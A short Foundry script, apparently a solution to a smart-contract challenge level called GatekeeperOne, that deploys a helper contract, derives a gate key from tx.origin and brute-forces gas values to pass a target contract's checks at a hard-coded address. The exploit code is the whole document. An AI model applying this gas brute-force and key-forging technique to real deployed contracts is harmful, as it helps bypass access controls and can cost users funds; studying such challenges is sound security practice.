/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Entrant {
    function enter(address _gateAddress) public payable returns (bool) {
        bytes8 gateKey = bytes8(uint64(uint160(address(tx.origin)))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = _gateAddress.call{
                value: msg.value,
                gas: 1000000 + i
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
    }
}

contract GatekeeperOne is Script {
    function run() public {
        vm.startBroadcast();

        Entrant entrant = new Entrant();
        entrant.enter(0x82ba5dc726D678b31fFa5A2861F70e7006B9bF48);

        vm.stopBroadcast();
    }
}
